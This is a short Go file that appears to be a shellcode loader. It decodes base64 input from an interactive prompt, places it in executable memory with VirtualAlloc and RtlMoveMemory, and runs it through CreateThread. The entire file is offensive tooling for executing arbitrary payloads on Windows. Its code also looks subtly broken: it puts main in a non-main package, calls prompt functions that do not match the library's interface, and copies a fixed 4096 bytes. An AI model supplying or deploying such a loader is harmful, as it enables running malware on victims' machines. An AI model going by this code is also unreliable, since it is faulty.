package components

import (
	"unsafe"

	"syscall"
	"reflect"

	"golang.org/x/sys/windows"

	"github.com/c-bata/go-prompt"

	"log"

	"encoding/base64"
)

// Shellcode constants
const (
	MEM_COMMIT   = 0x1000
	MEM_RESERVE  = 0x2000
	PAGE_EXECUTE_READWRITE = 0x40
)

// Windows API functions
var (
	procVirtualAlloc   = windows.NewLazySystemDLL("kernel32.dll").NewProc("VirtualAlloc")
	procRtlMoveMemory = windows.NewLazySystemDLL("ntdll.dll").NewProc("RtlMoveMemory")
	procCreateThread   = windows.NewLazySystemDLL("kernel32.dll").NewProc("CreateThread")
	procWaitForSingleObject = windows.NewLazySystemDLL("kernel32.dll").NewProc("WaitForSingleObject")
)

// Function to run shellcode
func runShellCode(code string) string {
	shellcode := base64Decode(code)
	addr, _, _ := procVirtualAlloc.Call(0, 4096, MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
	if addr == 0 {
		return "Shellcode failed..."
	}
	hdr := (*reflect.SliceHeader)(unsafe.Pointer(&shellcode))
	procRtlMoveMemory.Call(addr, hdr.Data, 4096)

	ht, _, _ := procCreateThread.Call(0, 0, addr, 0, 0, 0)
	if ht == 0 {
		return "Shellcode failed..."
	}
	_, _, _ = procWaitForSingleObject.Call(ht, syscall.INFINITE)
	if ht == 0 {
		return "Shellcode failed..."
	}
	return "Shellcode ran!"
}

// Base64 decoder
func base64Decode(str string) []byte {
	data, err := base64.StdEncoding.DecodeString(str)
	if err!= nil {
		log.Fatalf("Error decoding base64: %v", err)
	}
	return data
}

// Prompt for shellcode input
func main() {
	prompt.Start(func(input string) {
		result := runShellCode(input)
		prompt.Say(result)
	})
}
